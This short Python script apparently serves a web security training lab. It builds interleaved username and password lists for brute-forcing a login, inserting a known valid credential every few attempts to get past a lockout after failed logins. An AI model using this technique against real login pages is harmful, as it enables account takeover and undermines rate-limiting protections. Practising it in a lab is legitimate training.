# 1. Optimized User Generator (Pre-calculating list values for speed)
users = ["wiener" if i % 3 == 0 else "carlos" for i in range(1, 151)]
print("\n".join(users))

print("\n\n=====password list======\n\n")

# 2. Optimized Payload Interleaving (Avoids slow modulo logic inside loops)
try:
    with open("words.txt", "r") as f:
        # Using a generator expression to strip lines lazily
        payloads = [line.strip() for line in f]
    
    true_credential = "peter"
    final_passwords = []
    
    # Interleave "peter" after every 2 items using fast list slicing
    for i in range(0, len(payloads), 2):
        final_passwords.extend(payloads[i:i+2])
        if len(payloads[i:i+2]) == 2:  # Ensures it inserts only after a full pair
            final_passwords.append(true_credential)
            
    print("\n".join(final_passwords))

except FileNotFoundError:
    print("[Error] words.txt not found. Please create the file in this directory.")





